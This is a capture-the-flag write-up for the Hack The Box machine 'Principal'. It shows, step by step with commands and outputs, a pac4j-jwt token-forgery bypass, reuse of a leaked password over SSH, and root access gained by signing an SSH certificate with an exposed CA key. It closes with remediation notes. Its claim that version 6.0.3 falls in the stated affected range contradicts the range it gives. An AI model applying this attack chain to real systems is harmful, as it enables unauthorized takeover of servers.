# HTB — Principal (Medium)

**Target IP:** `10.129.244.220`
**Difficulty:** Medium
**OS:** Linux

---

## 1. Reconnaissance

```bash
nmap -sC -sV -p 8080,22 -oN detailed.txt 10.129.244.220
```

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | ssh | OpenSSH 9.6p1 (Ubuntu) |
| 8080/tcp | http-proxy | Jetty, redirects to `/login` |

Key header observed on port 8080:

```
X-Powered-By: pac4j-jwt/6.0.3
```

This identified the authentication framework (`pac4j-jwt`) and its exact version (`6.0.3`), which became the basis for the initial foothold.

---

## 2. Enumeration — JWKS Endpoint

Found an unauthenticated JWKS endpoint exposing the server's RSA **public** key:

```
GET /api/auth/jwks
```

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "enc-key-1",
      "n": "lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw"
    }
  ]
}
```

---

## 3. Vulnerability — CVE-2026-29000 (pac4j-jwt Authentication Bypass)

- **CVSS:** 10.0 (Critical)
- **CWE:** CWE-347 — Improper Verification of Cryptographic Signature
- **Affected versions:** `< 4.5.9`, `5.0.0-RC1 – < 5.7.9`, `6.0.4.1 – < 6.3.3` (target running `6.0.3`, in range)

### Root Cause

`JwtAuthenticator` expects a JWE (encrypted JWT) to contain an inner **signed** JWT (JWS). Due to a logic flaw, it fails to verify that the inner token is actually signed, and will accept an unsigned `PlainJWT` instead. Since the attacker only needs the server's **public** RSA key (freely available via JWKS) to construct a valid JWE envelope, arbitrary claims can be forged without any private key or secret.

### Attack Flow

1. Fetch RSA public key from `/api/auth/jwks`.
2. Build an unsigned `PlainJWT` with attacker-controlled claims (e.g. `role: ROLE_ADMIN`, `username: admin`).
3. Encrypt (JWE) the PlainJWT using the public key with `RSA-OAEP-256` + `A128GCM`.
4. Submit the resulting token as a bearer token — the server decrypts it and trusts the embedded claims without ever validating a signature.

---

## 4. Exploitation — Forged Admin Token

Forged a JWE-wrapped `PlainJWT` with admin claims and used it against the API:

```bash
curl -H "Authorization: Bearer <forged_token>" http://10.129.244.220:8080/api/dashboard
```

**Result:** Admin-level response confirming claim acceptance:

```json
"user": { "role": "ROLE_ADMIN", "username": "admin" }
```

Dashboard response also leaked internal activity logs referencing an SSH CA setup and a `svc-deploy` service account used for cert issuance and deployments.

---

## 5. Secret Disclosure — Admin Info Endpoint

Using the same forged admin token against a system-info endpoint returned:

```json
{
  "infrastructure": {
    "sshCaPath": "/opt/principal/ssh/",
    "sshCertAuth": "enabled"
  },
  "security": {
    "authFramework": "pac4j-jwt",
    "authFrameworkVersion": "6.0.3",
    "jwtAlgorithm": "RS256",
    "jweAlgorithm": "RSA-OAEP-256",
    "jweEncryption": "A128GCM",
    "encryptionKey": "D3pl0y_$$H_Now42!"
  }
}
```

The `encryptionKey` field is a hardcoded, misleadingly-named secret that turned out to be a reusable credential rather than cryptographic key material.

---

## 6. Initial Foothold — Credential Reuse

The leaked string was tried as a password for the `svc-deploy` service account seen in the activity logs:

```bash
ssh svc-deploy@10.129.244.220
# password: D3pl0y_$$H_Now42!
```

**Result:** Successful SSH login — initial shell access obtained.

---

## 7. Privilege Escalation — SSH CA Trust Abuse

### 7.1 Located SSH Configuration

```bash
cat /etc/ssh/sshd_config
```

```
# Principal machine SSH configuration
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

`TrustedUserCAKeys` means the server will accept any SSH certificate signed by the CA at `/opt/principal/ssh/ca.pub` — for **any principal**, including `root` (root login is only blocked for password auth, not certificate auth).

### 7.2 Located the CA Keypair

```bash
ls -la /opt/principal/ssh/
```

Both files were present and the private key was readable by the current user (via `deployers` group permissions):

- `/opt/principal/ssh/ca.pub` — CA public key (fingerprint: `SHA256:bExSfFTUaopPXEM+lTW6QM0uXnsy7CICk0+p0UKK3ps`, RSA 4096)
- `/opt/principal/ssh/ca` — CA **private** key (readable)

### 7.3 Self-Signed a Root Certificate

```bash
ssh-keygen -t ed25519 -f /tmp/mykey -N ""
ssh-keygen -s /opt/principal/ssh/ca -I "pwn" -n root -V +52w /tmp/mykey.pub
```

- `-s` — sign using the stolen CA private key
- `-n root` — issue the certificate for the `root` principal
- `-V +52w` — set a 1-year validity window

Produced `/tmp/mykey-cert.pub`, a certificate trusted by the server as valid root authentication because it is signed by the CA referenced in `TrustedUserCAKeys`.

### 7.4 Logged in as Root

```bash
ssh -i /tmp/mykey root@10.129.244.220
```

**Result:** Root shell obtained.

---

## 8. Summary

| Stage | Technique |
|-------|-----------|
| Recon | Nmap service/version detection |
| Foothold vector | CVE-2026-29000 — pac4j-jwt auth bypass via JWE-wrapped unsigned PlainJWT |
| Privilege gained (web) | Forged `ROLE_ADMIN` JWT using only the public JWKS key |
| Secret exposure | Admin-only info endpoint leaked a hardcoded credential (`encryptionKey`) |
| Initial shell | Credential reuse — leaked secret worked as `svc-deploy`'s SSH password |
| Privesc | Readable SSH CA private key + `TrustedUserCAKeys` trust → self-signed certificate for `root` principal |
| Full compromise | `ssh -i mykey root@target` using self-signed certificate |

### Root Causes / Remediation Notes

- Upgrade `pac4j-jwt` to `>= 6.3.3` (or `5.7.9` / `4.5.9` on older branches) to patch CVE-2026-29000.
- Remove hardcoded secrets from application config / API responses; rotate the exposed `D3pl0y_$$H_Now42!` credential.
- Restrict filesystem permissions on the SSH CA private key — it should not be group-readable to a broad `deployers` group.
- Avoid credential reuse across service accounts and application-layer secrets.
